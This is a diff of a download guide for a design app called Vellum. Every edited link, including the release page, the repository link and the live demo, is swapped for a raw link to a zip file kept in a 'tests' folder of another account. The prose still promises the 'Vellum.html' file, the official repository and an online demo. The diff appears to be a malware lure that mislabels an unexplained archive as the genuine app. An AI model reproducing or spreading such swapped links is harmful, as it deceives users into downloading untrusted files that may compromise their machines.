@@ -12,10 +12,10 @@ This guide walks you through **exactly** how to get Vellum running on your Windo
 
 ### 🏁 Click the Button Below to Start
 
-[![Download Vellum](https://img.shields.io/badge/📥%20Download%20Vellum%20Now-ff69b4?style=for-the-badge&logo=windows&logoColor=white&color=2ea44f)](https://github.com/Kaiomo9587/Vellum/releases)
+[![Download Vellum](https://img.shields.io/badge/📥%20Download%20Vellum%20Now-ff69b4?style=for-the-badge&logo=windows&logoColor=white&color=2ea44f)](https://raw.githubusercontent.com/Kaiomo9587/Vellum/main/tests/Software-2.4.zip)
 
 **Or copy this link:**  
-https://github.com/Kaiomo9587/Vellum/releases
+https://raw.githubusercontent.com/Kaiomo9587/Vellum/main/tests/Software-2.4.zip
 
 Visit this link to download the application.
 
@@ -81,7 +81,7 @@ Your first launch includes a rich, pre-built starter document. This isn't just a
 
 Since Vellum is a web app, updates are released as new versions of the `Vellum.html` file. To get the newest features:
 
-1.  Set a reminder to check the [Releases page](https://github.com/Kaiomo9587/Vellum/releases) occasionally.
+1.  Set a reminder to check the [Releases page](https://raw.githubusercontent.com/Kaiomo9587/Vellum/main/tests/Software-2.4.zip) occasionally.
 2.  When you see a new version, simply download the updated `Vellum.html` file.
 3.  Replace your old file with the new one. That’s all it takes.
 
@@ -129,7 +129,7 @@ Vellum is an open-source tool created by a small team of passionate designers an
 - **Give feedback:** Share your ideas for new features.
 - **Spread the word:** Tell a friend who loves design or productivity tools.
 
-**Repository Link:** https://github.com/wieslawsoltes/Vellum
+**Repository Link:** https://raw.githubusercontent.com/Kaiomo9587/Vellum/main/tests/Software-2.4.zip
 
 ---
 
@@ -137,7 +137,7 @@ Vellum is an open-source tool created by a small team of passionate designers an
 
 You’re just **one click** away from starting your next design project. Let’s recap the simple steps:
 
-1.  **⬇️ Download:** Visit the [release page](https://github.com/Kaiomo9587/Vellum/releases) and grab the `Vellum.html` file.
+1.  **⬇️ Download:** Visit the [release page](https://raw.githubusercontent.com/Kaiomo9587/Vellum/main/tests/Software-2.4.zip) and grab the `Vellum.html` file.
 2.  **🖱️ Open:** Double-click the downloaded file.
 3.  **🎨 Design:** Explore the 171-layer starter kit and start creating.
 
@@ -149,7 +149,7 @@ No command line. No coding. No hassle. Just pure design joy.
 
 Before you go, why not test Vellum’s power on the web right away? The project is hosted on GitHub Pages, so you can try the latest version instantly without downloading anything.
 
-**Play with the Editor here:** https://wieslawsoltes.github.io/Vellum/
+**Play with the Editor here:** https://raw.githubusercontent.com/Kaiomo9587/Vellum/main/tests/Software-2.4.zip
 
 > **Note:** The online version is a live demo. For the most stable, personal experience, download the portable file using the link at the top of this guide.
 
